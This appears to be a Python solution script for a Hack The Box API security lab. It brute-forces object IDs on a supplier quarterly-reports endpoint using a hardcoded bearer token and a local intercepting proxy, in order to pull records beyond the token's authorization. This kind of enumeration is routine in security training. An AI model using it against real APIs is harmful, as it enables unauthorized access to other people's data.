import requests

# target URL and endpoint
URL = "http://94.237.60.129:43360"
API_ENDPOINT = "/api/v1/suppliers/quarterly-reports/"
FULL_URL = URL + API_ENDPOINT

# prepare request

headers = {
    'Accept' : 'application/json',
    'User-Agent': 'htb-pyscript',
    'Authorization' : 'Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTcyNDY4NzU3NSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.2PFOqsaCX_EtQmGJ6NnAjV-ZyyPXVAuH81LZLamfSLYisw1kYdTSEv14zdtsna-XAQEmyBIZy_Qfyg-yYLuiCA'
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}
# brute force IDs using a for-loop

for i in range(500):
    res = requests.get(FULL_URL+str(i), headers=headers, proxies=proxies)

# Print request information
    print(res.text)

